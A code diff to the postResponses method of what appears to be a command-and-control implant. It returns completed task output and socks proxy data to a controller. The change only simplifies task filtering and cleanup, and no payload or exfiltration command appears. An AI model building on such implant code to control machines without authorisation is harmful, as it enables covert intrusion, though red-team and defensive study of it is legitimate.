@@ -57,22 +57,17 @@ CRYPTO_HERE
     def postResponses(self):
         try:
             with self._taskings_lock:
-                done   = [t for t in self.taskings if t.get("completed")]
-                normal = [t for t in done if not t.get("_screenshot_sent")]
+                done = [t for t in self.taskings if t.get("completed")]
 
             socks = []
             while not self.socks_out.empty():
                 socks.append(self.socks_out.get())
 
-            if not normal and not socks:
-                with self._taskings_lock:
-                    for t in done:
-                        if t in self.taskings:
-                            self.taskings.remove(t)
+            if not done and not socks:
                 return
 
             responses = []
-            for task in normal:
+            for task in done:
                 out = {
                     "task_id":     task["task_id"],
                     "user_output": task.get("result", ""),
@@ -88,7 +83,8 @@ CRYPTO_HERE
             message = {"action": "post_response", "responses": responses}
             if socks:
                 message["socks"] = socks
-            self.postMessageAndRetrieveResponse(message)
+            if responses:
+                self.postMessageAndRetrieveResponse(message)
 
             with self._taskings_lock:
                 for t in done:
